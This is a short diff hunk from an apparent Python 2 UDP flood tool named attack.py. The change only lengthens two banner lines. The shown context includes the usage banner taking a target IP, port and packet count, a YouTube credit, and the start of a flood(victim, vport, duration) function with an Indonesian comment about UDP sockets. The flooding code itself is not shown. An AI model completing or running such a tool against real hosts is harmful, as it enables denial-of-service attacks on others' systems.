@@ -3,14 +3,14 @@ import socket
 import random
 import sys
 def usage():
-    print "\33[32;1m================================================="
+    print "\33[32;1m=================================================="
     print "                      \33[31;1mCommand :"
     print "       \33[31;1mpython2 attack.py (ip) (port) (packet)"
     print " "
     print " "
     print "                  \33[1;33mThanks To : RoniYT"
     print "\33[1;33mLink YT : https://m.youtube.com/channel/UCNHZbNTS69kwCYJ8jcLzUzQ/"
-    print "\33[32;1m================================================="
+    print "\33[32;1m=================================================="
 def flood(victim, vport, duration):
     # Support us yaakk... :)
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
